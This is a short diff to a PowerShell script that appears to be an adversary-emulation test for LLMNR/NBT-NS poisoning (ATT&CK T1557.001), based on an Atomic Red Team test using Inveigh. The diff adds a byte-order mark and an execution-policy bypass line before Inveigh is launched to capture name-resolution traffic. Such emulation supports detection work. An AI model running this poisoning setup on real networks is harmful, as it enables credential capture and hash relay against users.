@@ -1,4 +1,4 @@
-# ATA091 - T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay (Windows)
+﻿# ATA091 - T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay (Windows)
 # Fuente ART: T1557.001 "LLMNR Poisoning with Inveigh (PowerShell)"
 # (guid deecd55f-afe0-4a62-9fba-4d1ba2deb321).
 # Adaptacion declarada: Inveigh pre-staged; consulta LLMNR/NBT-NS solo del invitado;
@@ -16,6 +16,7 @@ if (-not (Test-Path $inveigh)) {
 }
 $job = Start-Job -ScriptBlock {
     param($inveighPath, $outDir)
+    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
     . $inveighPath
     Invoke-Inveigh -ConsoleOutput N -LogOutput Y -FileOutputDirectory $outDir -NBNS Y -MDNS Y
 } -ArgumentList $inveigh, $ev
